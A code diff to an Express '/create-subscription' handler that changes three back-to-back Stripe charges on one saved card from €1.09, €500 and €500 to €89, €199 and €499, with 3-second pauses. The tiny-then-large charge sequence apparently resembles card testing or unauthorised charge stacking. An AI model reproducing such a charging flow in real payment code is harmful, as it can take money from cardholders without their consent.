@@ -86,10 +86,10 @@ app.post('/create-subscription', async (req, res) => {
       invoice_settings: { default_payment_method: paymentMethodId },
     });
 
-    // Charge 1 — €1.09
+    // Charge 1 — €89.00
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 109,
+        amount: 8900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -106,10 +106,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 2 — €500
+    // Charge 2 — €199
     try {
       const payment2 = await stripe.paymentIntents.create({
-        amount: 50000,
+        amount: 19900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -126,10 +126,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 3 — €500
+    // Charge 3 — €499
     try {
       const payment3 = await stripe.paymentIntents.create({
-        amount: 50000,
+        amount: 49900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
